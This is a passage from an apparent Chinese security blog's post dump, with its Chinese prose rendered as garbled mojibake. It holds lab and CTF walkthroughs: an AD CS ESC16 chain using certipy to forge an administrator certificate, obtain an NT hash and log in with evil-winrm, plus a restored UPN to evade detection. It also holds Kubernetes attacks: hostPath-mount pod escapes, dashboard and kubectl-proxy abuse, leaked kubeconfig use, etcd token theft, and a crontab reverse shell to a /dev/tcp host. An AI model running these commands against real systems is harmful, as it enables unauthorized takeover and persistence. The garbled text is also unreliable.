æ¨¡æ¿é€šå¸¸å…è®¸å¯¼å‡ºç§é’¥ï¼Œè¿™æ˜¯åç»­è®¤è¯çš„å…³é”®ã€‚ certipy req -k -dc-ip 10.10.11.69 -target DC01.FLUFFY.HTB -ca fluffy-DC01-CA -template UserCertipy v5.0.3 - by Oliver Lyak (ly4k)[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail[*] Requesting certificate via RPC[*] Request ID is 15[*] Successfully requested certificate[*] Got certificate with UPN administrator[*] Certificate has no object SID[*] Try using -sid to set the object SID or see the wiki for more details[*] Saving certificate and private key to administrator.pfx[*] Wrote certificate and private key to administrator.pfx 5ï¼šç”¨é€”ï¼šå°† ca_svc çš„ UPN è¿˜åŸä¸ºåŸå§‹å€¼ æ”»å‡»å®Œæˆåæ¸…ç†ç—•è¿¹ï¼Œé¿å…ç®¡ç†å‘˜å‘ç° ca_svc çš„ UPN è¢«ç¯¡æ”¹ï¼› è‹¥ä¸è¿˜åŸï¼Œå¯èƒ½è§¦å‘æ—¥å¿—å‘Šè­¦æˆ–è¢«å®‰å…¨å·¥å…·æ£€æµ‹ã€‚ certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn ca_svc@fluffy.htb -user ca_svc updateCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Updating user ca_svc: userPrincipalName : ca_svc@fluffy.htb[*] Successfully updated ca_svc 6ï¼šä½¿ç”¨ administrator.pfx è¯ä¹¦è®¤è¯ä¸ºåŸŸç®¡ç†å‘˜ é€šè¿‡ç¬¬ 5 æ­¥ç”³è¯·çš„ administrator.pfx è¯ä¹¦ï¼ˆåŒ…å«ç§é’¥ï¼‰è¿›è¡Œ Kerberos è®¤è¯ï¼› æˆåŠŸåå¯è·å– administrator çš„ NT å“ˆå¸Œæˆ– TGT ç¥¨æ®ï¼Œç›´æ¥ç™»å½•åŸŸæ§æˆ–å…¶ä»–é«˜æƒé™èµ„æºï¼ˆå¦‚é€šè¿‡ evil-winrm è¿œç¨‹æ§åˆ¶åŸŸæ§ï¼‰ã€‚ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb[*] Certificate identities:[*] SAN UPN: administrator[*] Using principal: administrator@fluffy.htb[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to administrator.ccache[*] Wrote credential cache to administrator.ccache[*] Trying to retrieve NT hash for administrator[*] Got hash for administrator@fluffy.htb: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e evilç™»å½•æ‹¿åˆ°ROOT evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69 æ•´ä½“æ”»å‡»é€»è¾‘ï¼ˆæ ¸å¿ƒé“¾ï¼‰ æƒé™å‡†å¤‡ï¼šp.agila éœ€å¯¹ ca_svc æœ‰ GenericWrite æˆ– WriteProperty æƒé™ï¼ˆç”¨äºä¿®æ”¹ UPN å’Œæ·»åŠ å½±å­å‡­æ®ï¼‰ï¼› èº«ä»½ä¼ªè£…ï¼šä¿®æ”¹ ca_svc çš„ UPN ä¸º administratorï¼Œæ¬ºéª— CA æœåŠ¡å™¨ï¼› å‡­æ®æ³¨å…¥ï¼šä¸º ca_svc æ·»åŠ å½±å­å‡­æ®ï¼Œè·å–è®¤è¯ç”¨çš„ Kerberos ç¥¨æ®ï¼› è¯ä¹¦ç”³è¯·ï¼šåˆ©ç”¨ä¼ªè£…èº«ä»½å’Œå½±å­å‡­æ®ï¼Œç”³è¯· administrator çš„é«˜æƒé™è¯ä¹¦ï¼› æƒé™æå‡ï¼šç”¨è¯ä¹¦è®¤è¯ä¸º administratorï¼Œå®ç°åŸŸç®¡ç†å‘˜æƒé™æ¥ç®¡ï¼› ç—•è¿¹æ¸…ç†ï¼šè¿˜åŸ ca_svc çš„ UPNï¼Œé™ä½è¢«å‘ç°çš„æ¦‚ç‡ã€‚","tags":["windows","ESC16"]},{"title":"K8s-3-é¶åœºæ¸—é€","path":"/2025/08/31/posts/k8s3/","content":"K8s-3-æœªæˆæƒè®¿é—® K8Sé›†ç¾¤æ¸—é€ ç¡®ä¿éƒ½runningä¸ç„¶å®éªŒä¸è¡Œè€Œä¸”ç‰ˆæœ¬è¦åˆé€‚ æ³¨æ„ï¼šk8sé‡Œé¢çš„podé‡‡ç”¨çš„æ˜¯yamlè¯­æ³• dockeré‡‡ç”¨dockerfile ä½ æ”»å‡»çš„éƒ½æ˜¯nodeèŠ‚ç‚¹ä¸»æœºï¼Œä½†æ˜¯ä½ è¦æ”»å‡»çš„æ˜¯masteræ‰€ä»¥ç”¨åˆ°æ±¡ç‚¹ï¼ˆtaintï¼‰ç”¨äºé™åˆ¶å“ªäº›Podå¯ä»¥è¢«è°ƒåº¦åˆ°æŸä¸€ä¸ªèŠ‚ç‚¹ï¼ˆéƒ¨ç½²åˆ°masterä¸Šï¼‰ç„¶åé€ƒé€¸è·å¾—masteræƒé™ 1ï¼šç›¸å…³å‘½ä»¤-å¯»æ‰¾æ±¡ç‚¹#æŸ¥çœ‹podå½’å±kubectl get pods -o wide#æŸ¥çœ‹ç›®æ ‡nodeæ±¡ç‚¹kubectl describe nodes master#æŸ¥çœ‹ç›®æ ‡æ±¡ç‚¹å¹¶ç­›é€‰kubectl describe node master | grep Taints -A 5#æ¸…é™¤ç›®æ ‡nodeæ±¡ç‚¹kubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule-NoScheduleï¼šè¡¨ç¤ºä¸å…è®¸ Pod è¢«è‡ªåŠ¨è°ƒåº¦åˆ°å¸¦æœ‰æ­¤æ±¡ç‚¹çš„èŠ‚ç‚¹ä¸Šã€‚åªæœ‰å½“ Pod å…·æœ‰ä¸æ±¡ç‚¹åŒ¹é…çš„å®¹å¿åº¦æ—¶ï¼Œæ‰èƒ½åœ¨è¿™äº›èŠ‚ç‚¹ä¸Šè°ƒåº¦ Podã€‚ æ‰€ä»¥ä½ æ”¾ä¸åˆ°Masterä¸Šé¢ å½“ä½ åœ¨masteræ„å»ºä¸€ä¸ªé•œåƒå…¶ä»–IPéƒ½èƒ½è®¿é—®å› ä¸ºä»–åšäº†è´Ÿè½½å‡è¡¡-ä¸€èˆ¬æ¥è¯´ä½ æ‹¿ä¸‹ä¸€å°ä¸»æœºå¯¹åº”å“ªå°IP-ä½†æ˜¯K8Så¯èƒ½è¿›å»ä¼šæ‡µé€¼ 2ï¼šé¶åœºå®æˆ˜é»˜è®¤è®¾è®¡ï¼šAPI Server ä»…æš´éœ²äºå†…ç½‘1ï¼škubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous æ‰“å¼€6443é»˜è®¤APIè®¿é—®https://192.168.139.130:6443/api/v1/namespaces/default/pods/POSTï¼šapiVersion:v1,kind:Pod,metadata:annotations:kubectl.kubernetes.io/last-applied-configuration:\\apiVersion\\:\\v1\\,\\kind\\:\\Pod\\,\\metadata\\:\\annotations\\:, ame\\:\\test02\\, amespace\\:\\default\\,\\spec\\:\\containers\\:[\\image\\: ginx:1.14.2\\, ame\\:\\test02\\,\\volumeMounts\\:[\\mountPath\\:\\/host\\, ame\\:\\host\\]],\\volumes\\:[\\hostPath\\:\\path\\:\\/\\,\\type\\:\\Directory\\, ame\\:\\host\\] ,name:test02,namespace:default,spec:containers:[image:nginx:1.14.2,name:test02,volumeMounts:[mountPath:/host,name:host]],volumes:[hostPath:path:/,type:Directory,name:host]2ï¼šåº”ç”¨éƒ¨ç½²æ¼æ´kubectl create deployment struts --image=vulhub/struts2:2.3.28 åˆ›å»ºé•œåƒkubectl expose deploy struts --port=8080 --target-port=8080 --type=NodePort ä¸ºä¸Šé¢åˆ›å»ºçš„ struts Deployment æš´éœ²ä¸€ä¸ª Serviceï¼Œä½¿å¤–éƒ¨ï¼ˆæˆ–é›†ç¾¤å†…å…¶ä»–æœåŠ¡ï¼‰å¯ä»¥è®¿é—®è¯¥åº”ç”¨ã€‚kubectl get pod,svc æŸ¥çœ‹å½“å‰é›†ç¾¤ä¸­æ‰€æœ‰ Pod å’Œ Service çš„çŠ¶æ€ä¿¡æ¯ã€‚ç»•è¿‡ å¤šåˆ›å»ºå‡ æ¬¡æ”¾åˆ°masterèŠ‚ç‚¹ä¸Šcat x.yaml EOFapiVersion: v1kind: Podmetadata: name: xxxspec: tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule containers: - name: xxx image: ubuntu:18.04 command: [/bin/sleep, 3650d] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: DirectoryEOF æ£€æµ‹struct2æ¼æ´ç„¶åä¸Šä¼ webshell è¿æ¥ä¸Šå» æ³¨æ„è¿™é‡Œå“¥æ–¯æ‹‰ï¼šwebshellæ˜¯æ²¡æœ‰äº¤äº’çš„ [root@master-1 ~]# kubectl cp kubectl struts-6555fd8cf8-qbjx4:[root@master-1 ~]# kubectl cp cdk_linux_amd64 struts-6555fd8cf8-qbjx4: æ”¾ä¸Šå» ä½¿ç”¨cdk evaluateæ‰«æå‘ç°APIserveræœªæˆæƒ curl -k https://192.168.79.131:6443/api/v1/namespaces/default/pods å¯ä»¥è·å–podä¿¡æ¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç»•è¿‡nodeèŠ‚ç‚¹åˆ›å»ºåˆ°masterçš„yamlæ–‡ä»¶ ç»•è¿‡äº¤äº’å¦‚å«ä½ è¾“å…¥usernameå’Œpasswordå®ƒå¯ä»¥è·³è¿‡ .kubectl â€“serverhttps://192.168.79.131:6443 â€“insecure-skip-tls-verifytrue â€“usernamea â€“passworda create -f .x.yaml åˆ›å»ºæˆåŠŸ å¤šåˆ›å»ºå‡ æ¬¡ æˆåŠŸåˆ›å»ºåˆ°masterèŠ‚ç‚¹æˆ‘ä»¬è¿›å»å¼€å§‹é€ƒé€¸ .kubectl â€“serverhttps://192.168.79.131:6443 â€“insecure-skip-tls-verifytrue â€“usernamea â€“passworda create -f .x.yaml åˆ›å»ºæˆåŠŸ å¤šåˆ›å»ºå‡ æ¬¡ æˆåŠŸåˆ›å»ºåˆ°masterèŠ‚ç‚¹æˆ‘ä»¬è¿›å»å¼€å§‹é€ƒé€¸ .kubectl â€“serverhttps://192.168.1.131:6443 â€“insecure-skip-tls-verifytrue â€“usernamea â€“passworda exec xxx1 â€“ bash -c â€œcat masterrootflagâ€ æ‹¿ä¸‹åå†™å…¥è®¡åˆ’ä»»åŠ¡ ä¹Ÿå¯ä»¥åˆ©ç”¨èŠ‚ç‚¹æ³„æ¼çš„configæ¨ªå‘ç§»åŠ¨èŠ‚ç‚¹ .kubectl -s https://10.96.0.1:443/ â€“kubeconfigconfig â€“insecure-skip-tls-verifytrue get nodes .kubectl apply -f test.yaml -n default â€“kubeconfigconfig .kubectl -n default â€“kubeconfigconfig exec xiaodisec â€“ bash -c â€œls mntrootâ€","tags":["k8s"]},{"title":"K8s-2-æœªæˆæƒè®¿é—®-proxy","path":"/2025/08/28/posts/k8s2/","content":"K8s-2-æœªæˆæƒè®¿é—® K8Sé›†ç¾¤å®‰è£…é…ç½®åœ¨ä¸Šä¸ªåšå®¢ K8Sé›†ç¾¤æ¸—é€ ç¡®ä¿éƒ½runningä¸ç„¶å®éªŒä¸è¡Œè€Œä¸”ç‰ˆæœ¬è¦åˆé€‚ æ³¨æ„ï¼šk8sé‡Œé¢çš„podé‡‡ç”¨çš„æ˜¯yamlè¯­æ³• dockeré‡‡ç”¨dockerfile 1ï¼šDashboardæœªæˆæƒè®¿é—®8001é»˜è®¤ç«¯å£ï¼š8001é…ç½®ä¸å½“å¯¼è‡´dashboardæœªæˆæƒè®¿é—®,é€šè¿‡dashboardå¯ä»¥æ§åˆ¶æ•´ä¸ªé›†ç¾¤ã€‚kubernetes dashboardçš„æœªæˆæƒå…¶å®åˆ†ä¸¤ç§æƒ…å†µï¼šä¸€ç§æ˜¯åœ¨æœ¬èº«å°±å­˜åœ¨ç€ä¸éœ€è¦ç™»å½•çš„httpæ¥å£ï¼Œä½†æ¥å£æœ¬èº«å¹¶ä¸ä¼šæš´éœ²å‡ºæ¥ï¼Œå¦‚æ¥å£è¢«æš´éœ²åœ¨å¤–ï¼Œå°±ä¼šå¯¼è‡´dashboardæœªæˆæƒã€‚å¦å¤–ä¸€ç§æƒ…å†µåˆ™æ˜¯å¼€å‘å«Œç™»å½•éº»çƒ¦ï¼Œä¿®æ”¹äº†é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—å®‰å…¨æ¥å£httpsçš„dashboardé¡µé¢å¯ä»¥è·³è¿‡ç™»å½•ã€‚*å¤ç°åˆ©ç”¨ï¼š*ç”¨æˆ·å¼€å¯enable-skip-loginæ—¶å¯ä»¥åœ¨ç™»å½•ç•Œé¢ç‚¹å‡»è·³è¿‡ç™»å½•è¿›dashboard*Kubernetes-dashboardç»‘å®šcluster-adminï¼ˆæ‹¥æœ‰ç®¡ç†é›†ç¾¤çš„æœ€é«˜æƒé™ï¼‰1ã€å®‰è£…ï¼šhttps://blog.csdn.net/justlpf/article/details/1307187742ã€å¯åŠ¨ï¼škubectl create -f recommended.yaml --valid=false è¿™é‡Œæˆ‘ç”¨nodeçš„IPè¿›å»äº† 3ã€å¸è½½ï¼škubectl delete -f recommended.yaml4ã€æŸ¥çœ‹ï¼škubectl get pod,svc -n kubernetes-dashboard5ã€åˆ©ç”¨ï¼šæ–°å¢Podåç»­åŒå‰é¢åˆ©ç”¨ä¸€è‡´*æ‰¾åˆ°æš´éœ²é¢æ¿-dashboardè·³è¿‡-åˆ›å»ºæˆ–ä¸Šä¼ pod-è¿›å…¥æ‰§è¡Œ-åˆ©ç”¨æŒ‚è½½é€ƒé€¸recommended.yaml# Copyright 2017 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the License);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an AS IS BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.apiVersion: v1kind: Namespacemetadata: name: kubernetes-dashboard---apiVersion: v1kind: ServiceAccountmetadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboard---kind: ServiceapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: type: NodePort ports: - port: 443 targetPort: 8443 nodePort: 30009 selector: k8s-app: kubernetes-dashboard---apiVersion: v1kind: Secretmetadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard-certs namespace: kubernetes-dashboardtype: Opaque---apiVersion: v1kind: Secretmetadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard-csrf namespace: kubernetes-dashboardtype: Opaquedata: csrf: ---apiVersion: v1kind: Secretmetadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard-key-holder namespace: kubernetes-dashboardtype: Opaque---kind: ConfigMapapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard-settings namespace: kubernetes-dashboard---kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardrules: # Allow Dashboard to get, update and delete Dashboard exclusive secrets. - apiGroups: [] resources: [secrets] resourceNames: [kubernetes-dashboard-key-holder, kubernetes-dashboard-certs, kubernetes-dashboard-csrf] verbs: [get, update, delete] # Allow Dashboard to get and update kubernetes-dashboard-settings config map. - apiGroups: [] resources: [configmaps] resourceNames: [kubernetes-dashboard-settings] verbs: [get, update] # Allow Dashboard to get metrics. - apiGroups: [] resources: [services] resourceNames: [heapster, dashboard-metrics-scraper] verbs: [proxy] - apiGroups: [] resources: [services/proxy] resourceNames: [heapster, http:heapster:, https:heapster:, dashboard-metrics-scraper, http:dashboard-metrics-scraper] verbs: [get]---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboardrules: # Allow Metrics Scraper to get metrics from the Metrics server - apiGroups: [metrics.k8s.io] resources: [pods, nodes] verbs: [get, list, watch]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardroleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: kubernetes-dashboardsubjects: - kind: ServiceAccount name: kubernetes-dashboard namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: kubernetes-dashboardroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects: - kind: ServiceAccount name: kubernetes-dashboard namespace: kubernetes-dashboard---kind: DeploymentapiVersion: apps/v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kubernetes-dashboard template: metadata: labels: k8s-app: kubernetes-dashboard spec: securityContext: seccompProfile: type: RuntimeDefault containers: - name: kubernetes-dashboard image: kubernetesui/dashboard:v2.5.0 imagePullPolicy: Always ports: - containerPort: 8443 protocol: TCP args: - --enable-skip-login - --auto-generate-certificates - --namespace=kubernetes-dashboard # Uncomment the following line to manually specify Kubernetes API server Host # If not specified, Dashboard will attempt to auto discover the API server and connect # to it. Uncomment only if the default does not work. # - --apiserver-host=http://my-address:port volumeMounts: - name: kubernetes-dashboard-certs mountPath: /certs # Create on-disk volume to store exec logs - mountPath: /tmp name: tmp-volume livenessProbe: httpGet: scheme: HTTPS path: / port: 8443 initialDelaySeconds: 30 timeoutSeconds: 30 securityContext: allowPrivilegeEscalation: false readOnlyRootFilesystem: true runAsUser: 1001 runAsGroup: 2001 volumes: - name: kubernetes-dashboard-certs secret: secretName: kubernetes-dashboard-certs - name: tmp-volume emptyDir: serviceAccountName: kubernetes-dashboard nodeSelector: kubernetes.io/os: linux # Comment the following tolerations if Dashboard must not be deployed on master tolerations: - key: node-role.kubernetes.io/master effect: NoSchedule---kind: ServiceapiVersion: v1metadata: labels: k8s-app: dashboard-metrics-scraper name: dashboard-metrics-scraper namespace: kubernetes-dashboardspec: ports: - port: 8000 targetPort: 8000 selector: k8s-app: dashboard-metrics-scraper---kind: DeploymentapiVersion: apps/v1metadata: labels: k8s-app: dashboard-metrics-scraper name: dashboard-metrics-scraper namespace: kubernetes-dashboardspec: replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: k8s-app: dashboard-metrics-scraper template: metadata: labels: k8s-app: dashboard-metrics-scraper spec: securityContext: seccompProfile: type: RuntimeDefault containers: - name: dashboard-metrics-scraper image: kubernetesui/metrics-scraper:v1.0.7 ports: - containerPort: 8000 protocol: TCP livenessProbe: httpGet: scheme: HTTP path: / port: 8000 initialDelaySeconds: 30 timeoutSeconds: 30 volumeMounts: - mountPath: /tmp name: tmp-volume securityContext: allowPrivilegeEscalation: false readOnlyRootFilesystem: true runAsUser: 1001 runAsGroup: 2001 serviceAccountName: kubernetes-dashboard nodeSelector: kubernetes.io/os: linux # Comment the following tolerations if Dashboard must not be deployed on master tolerations: - key: node-role.kubernetes.io/master effect: NoSchedule volumes: - name: tmp-volume emptyDir: ç‚¹å‡»è·³è¿‡å¯ä»¥ç›´æ¥è¿›å»è®°å¾—æ¢æµè§ˆå™¨ ç‚¹å‡»PODS - ç‚¹å‡»åŠ å·ä¸Šä¼ æ¶æ„pods test.yamlapiVersion: v1kind: Podmetadata: name: hajimediespec: containers: - image: nginx name: hajimedie volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / æˆåŠŸåè¿›å…¥å¸¦æœ‰æ¶æ„æŒ‚è½½é€ƒé€¸çš„shellç•Œé¢ åšå®Œå®éªŒåˆ é™¤kubectl delete -f recommended.yaml 2ï¼šProxyä»£ç†æœªæˆæƒå½“è¿ç»´äººå‘˜éœ€è¦æŸä¸ªç¯å¢ƒæš´éœ²ç«¯å£æˆ–è€…IPæ—¶ï¼Œä¼šç”¨åˆ°Kubectl Proxyä½¿ç”¨kubectl proxyå‘½ä»¤å°±å¯ä»¥ä½¿API serverç›‘å¬åœ¨æœ¬åœ°çš„xxxxç«¯å£ä¸Šç¯å¢ƒæ­å»ºï¼škubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009æŠŠAPISERBERä»£ç†å¸¦8009ç«¯å£äº† å°±å’Œç¬¬ä¸€ä¸ªåšå®¢çš„APIserveræœªæˆæƒæ”»å‡»ä¸€æ ·äº† æ¥ä¸‹æ¥å°±æ˜¯ä¸Šä¼ pods æ‹¿shellé€ƒé€¸å’Œç¬¬ä¸€ä¸ªåšå®¢ä¸€æ ·äº† 3ï¼šConfigé‰´æƒæ–‡ä»¶æ³„æ¼æ”»å‡»è€…é€šè¿‡Webshellã€Githubç­‰æ‹¿åˆ°äº†K8sé…ç½®çš„Configæ–‡ä»¶ï¼Œæ“ä½œé›†ç¾¤ï¼Œä»è€Œæ¥ç®¡æ‰€æœ‰å®¹å™¨ã€‚K8s configfileä½œä¸ºK8sé›†ç¾¤çš„ç®¡ç†å‡­è¯ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³K8sé›†ç¾¤çš„è¯¦ç»†ä¿¡æ¯(API Serverã€ç™»å½•å‡­è¯)ã€‚é»˜è®¤ä½ç½®/root/.kube/config[root@master-1 .kube]# ls -altotal 16drwxr-xr-x. 4 root root 51 Aug 27 23:25 .dr-xr-x---. 6 root root 4096 Aug 28 23:41 ..drwxr-x---. 3 root root 23 Aug 27 23:25 cache-rw-------. 1 root root 5450 Aug 27 23:25 configdrwxr-x---. 3 root root 4096 Aug 28 23:38 http-cache[root@master-1 .kube]# kubectl -s https://192.168.79.131:6443/ â€“kubeconfigconfig â€“insecure-skip-tls-verifytrue get nodes ç„¶åç”¨ä¸Šä¼ pods ç™»å½• æŒ‚è½½é€ƒé€¸ kubectl -s https://192.168.79.131:6443/ â€“kubeconfigconfig â€“insecure-skip-tls-verifytrue apply -f test.yaml -n default â€“kubeconfigconfig kubectl -s https://192.168.79.131:6443/ â€“kubeconfigconfig â€“insecure-skip-tls-verifytrue exec -it xiaodisec bash -n default â€“kubeconfigconfig åå¼¹ echo -e â€œ* * * * * root bash -i devtcp192.168.79.1314444 01 â€ mntetccrontab 4ï¼šetcdæœªæˆæƒè®¿é—®etcd ä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€/etc/kubernetes/manifests/etcd.yamlsystemctl restart kubelet.service é‡å¯--client-cert-auth è®¾ç½®ä¸ºfalseå³å¯ä¸ç”¨éªŒè¯ æ²¡æœ‰æš´éœ²å°±ç”¨SSRF --listen-cilent-url=åé¢IPå¦‚æœæ˜¯127.0.0.1è¡¨ç¤ºåªå…è®¸å†…éƒ¨è®¿é—® ä½†æ˜¯SSRFå¯ç»•è¿‡ä¸‰ç§æ–¹æ³•ï¼šç¬¬ä¸€ç§ï¼šæ²¡æœ‰é…ç½®æŒ‡å®š--client-cert-auth å‚æ•°æ‰“å¼€è¯ä¹¦æ ¡éªŒï¼Œæš´éœ²åœ¨å¤–EtcdæœåŠ¡å­˜åœ¨æœªæˆæƒè®¿é—®é£é™©ã€‚-æš´éœ²å¤–éƒ¨å¯ä»¥è®¿é—®ï¼Œç›´æ¥æœªæˆæƒè®¿é—®è·å–secretså’Œtokenåˆ©ç”¨ç¬¬äºŒç§ï¼šåœ¨æ‰“å¼€è¯ä¹¦æ ¡éªŒé€‰é¡¹åï¼Œé€šè¿‡æœ¬åœ°127.0.0.1:2379å¯å…è®¤è¯è®¿é—®EtcdæœåŠ¡ï¼Œä½†é€šè¿‡å…¶ä»–åœ°å€è®¿é—®è¦æºå¸¦certè¿›è¡Œè®¤è¯è®¿é—®ï¼Œä¸€èˆ¬é…åˆssrfæˆ–å…¶ä»–åˆ©ç”¨ï¼Œè¾ƒä¸ºé¸¡è‚‹ã€‚-åªèƒ½æœ¬åœ°è®¿é—®ï¼Œç›´æ¥æœªæˆæƒè®¿é—®è·å–secretså’Œtokenåˆ©ç”¨ç¬¬ä¸‰ç§ï¼šå®æˆ˜ä¸­åœ¨å®‰è£…k8sé»˜è®¤çš„é…ç½®2379åªä¼šç›‘å¬æœ¬åœ°ï¼Œå¦‚æœè®¿é—®æ²¡è®¾ç½®0.0.0.0æš´éœ²ï¼Œé‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€æœ€å¤šå°±æ˜¯æœ¬åœ°è®¿é—®ï¼Œä¸èƒ½å…¬ç½‘è®¿é—®ï¼Œåªèƒ½é…åˆssrfæˆ–å…¶ä»–ã€‚-åªèƒ½æœ¬åœ°è®¿é—®ï¼Œåˆ©ç”¨ssrfæˆ–å…¶ä»–è¿›è¡Œè·å–secretså’Œtokenåˆ©ç”¨*å¤ç°åˆ©ç”¨ï¼š*æš´éœ²etcdæœªæˆæƒ-è·å–secretstoken-é€šè¿‡è®¿é—®API-Serveræ¥ç®¡*SSRFç»•é™åˆ¶è®¿é—®-è·å–secretstoken-é€šè¿‡tokenè®¿é—®API-Server*V2/V3ç‰ˆæœ¬åˆ©ç”¨å‚è€ƒï¼šhttps://www.cnblogs.com/qtzd/p/k8s_etcd.html .etcdctl â€“endpoints192.168.79.131:23791 get â€“prefix â€“keys-only | grep secrets è¯»å–service account token: .etcdctl â€“endpoints192.168.79.131:23791 get â€“prefix â€“keys-only | grep secretskube-systemclusterrole .etcdctl â€“endpoints192.168.79.131:23791 get registrysecretskube-systemclusterrole-aggregation-controller-token-jdp5z é€šè¿‡tokenè®¿é—®API-Serverï¼Œè·å–é›†ç¾¤çš„æƒé™ï¼š kubectl â€“insecure-skip-tls-verify -s https://192.168.79.131:6443/ â€“tokenâ€xxxxxâ€ -n kube-system get pods","tags":["k8s"]},{"title":"K8s-1-æœªæˆæƒè®¿é—®","path":"/2025/08/27/posts/k8s1/","content":"K8s-1-æœªæˆæƒè®¿é—® K8Sé›†ç¾¤å®‰è£…é…ç½® å®‰è£…K8Sç¯å¢ƒä¸€å…±ä¸‰å°ä¸»æœºä¸€å°ç»ˆç«¯ä¸¤å°èŠ‚ç‚¹# åœ¨ master èŠ‚ç‚¹ä¸Šæ‰§è¡Œhostnamectl set-hostname master-1# åœ¨ç¬¬ä¸€ä¸ª worker èŠ‚ç‚¹ä¸Šæ‰§è¡Œhostnamectl set-hostname node1# åœ¨ç¬¬äºŒä¸ª worker èŠ‚ç‚¹ä¸Šæ‰§è¡Œhostnamectl set-hostname node2cat EOF /etc/hosts192.168.79.141 master-1192.168.79.140 node1192.168.79.139 node2EOFyum remove -y docker-ce docker-ce-cli containerd.iorm -rf /var/lib/dockerrm -rf /var/lib/containerdyum install -y docker-ce-18.09.9-3.el7 docker-ce-cli-18.09.9-3.el7 containerd.iosystemctl disable firewalldsystemctl stop firewalldsetenforce 0sed -i s/SELINUX=permissive/SELINUX=disabled/ /etc/sysconfig/selinuxsed -i s/SELINUX=enforcing/SELINUX=disabled/g /etc/selinux/configswapoff -ased -i s/.*swap.*/#/ /etc/fstabcat EOF /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOF# æ·»åŠ  Kubernetes çš„é˜¿é‡Œäº‘ yum æºcat EOF /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF# å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„ kubeadm, kubelet, kubectlyum install -y kubectl-1.16.0-0 kubeadm-1.16.0-0 kubelet-1.16.0-0# è®¾ç½® kubelet å¼€æœºè‡ªå¯å¹¶ç«‹å³å¯åŠ¨ï¼ˆæ­¤æ—¶ä¼šæŠ¥é”™ï¼Œæ­£å¸¸ï¼‰systemctl enable kubelet systemctl start kubeletmasteræ‰§è¡Œ# åˆå§‹åŒ–æ§åˆ¶å¹³é¢kubeadm init --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.16.0 --apiserver-advertise-address 192.168.79.141 --pod-network-cidr=10.244.0.0/16 --token-ttl 0# åˆå§‹åŒ–æˆåŠŸåï¼Œé…ç½® kubectl çš„è®¤è¯æ–‡ä»¶mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config[root@master-1 ~]# kubectl get nodesNAME STATUS ROLES AGE VERSIONmaster-1 NotReady master 2m4s v1.16.0[root@master-1 ~]# node--------ä¸ºä»€ä¹ˆ Kubernetes éœ€è¦ç½‘ç»œæ’ä»¶ï¼ˆå¦‚ Flannel/Calicoï¼‰ï¼ŸKubernetes æœ¬èº«ä¸æä¾›ç½‘ç»œåŠŸèƒ½ï¼Œå®ƒä¾èµ– CNIï¼ˆContainer Network Interfaceï¼‰æ’ä»¶ æ¥å®ç° Pod ä¹‹é—´çš„é€šä¿¡ã€‚kubectl get nodescurl -O https://raw.githubusercontent.com/flannel-io/flannel/v0.12.0/Documentation/kube-flannel.ymlkubectl apply -f kube-flannel.ymlkubectl get daemonset -n kube-systemkubectl get pods -n kube-system -o wide | grep flannelwatch kubectl get pods -n kube-systemkubeadm token listçœ‹tokenopenssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 